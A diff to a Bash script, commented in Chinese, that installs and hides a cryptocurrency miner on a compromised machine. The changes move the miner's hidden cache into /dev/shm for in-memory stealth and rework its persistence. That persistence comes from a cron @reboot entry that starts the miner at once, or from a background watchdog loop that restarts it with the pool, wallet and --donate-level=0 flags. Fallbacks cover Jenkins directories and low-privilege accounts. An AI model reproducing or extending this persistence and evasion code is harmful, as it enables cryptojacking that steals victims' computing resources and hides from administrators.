@@ -15,19 +15,12 @@ WORKER_NAME="worker"
 
 ### 初始化环境 ###
 init_env() {
-    # 按优先级尝试不同的存储目录
-    for dir in "/var/tmp" "/tmp" "/var/lib/jenkins" "/var/lib/jenkins/tmp" "/var/cache" "/var/lib"; do
-        if [ -w "$dir" ]; then
-            STORE_DIR="$dir/.${BIN_NAME}_cache"
-            break
-        fi
-    done
-    
-    # 如果所有目录都不可写，使用当前目录
-    if [ -z "${STORE_DIR:-}" ]; then
-        STORE_DIR="$(pwd)/.${BIN_NAME}_cache"
+    # 创建内存文件系统
+    if [ -d "/dev/shm" ]; then
+        STORE_DIR="/dev/shm/.${BIN_NAME}_cache"
+    else
+        STORE_DIR="/tmp/.${BIN_NAME}_cache"
     fi
-    
     mkdir -p "$STORE_DIR"
     
     # 选择下载工具（优先用 curl）
@@ -86,22 +79,28 @@ EOF
     # 2. 尝试 Cron（低权限）
     elif command -v crontab >/dev/null; then
         echo "[+] 使用 Cron 持久化"
-        (crontab -l 2>/dev/null; echo "@reboot ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b") | crontab -
+        # 创建内存中的启动命令
+        STARTUP_CMD="cd ${STORE_DIR} && nohup ${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b >/dev/null 2>&1 &"
+        # 添加到 crontab
+        (crontab -l 2>/dev/null; echo "@reboot $STARTUP_CMD") | crontab -
+        # 立即执行启动命令
+        eval "$STARTUP_CMD"
     
     # 3. 回退到 while 循环（最低权限）
     else
         echo "[+] 使用 While 循环监控"
-        cat <<EOF > "${STORE_DIR}/.watchdog"
-#!/bin/bash
-while true; do
-    if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
-        ${STORE_DIR}/${BIN_NAME} -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" -p "$WORKER_NAME" --donate-level=0 -b &
-    fi
-    sleep 300
-done
-EOF
-        chmod +x "${STORE_DIR}/.watchdog"
-        nohup "${STORE_DIR}/.watchdog" >/dev/null 2>&1 &
+        # 直接在内存中创建监控函数
+        monitor_func() {
+            while true; do
+                if ! pgrep -f "${BIN_NAME}.*${POOL}" >/dev/null; then
+                    cd "${STORE_DIR}"
+                    nohup "${STORE_DIR}/${BIN_NAME}" -o "$POOL" -u "$WALLET" --cpu-max-threads-hint "$THREADS" -p "$WORKER_NAME" --donate-level=0 -b >/dev/null 2>&1 &
+                fi
+                sleep 300
+            done
+        }
+        # 在后台启动监控函数
+        monitor_func &
     fi
 }
 
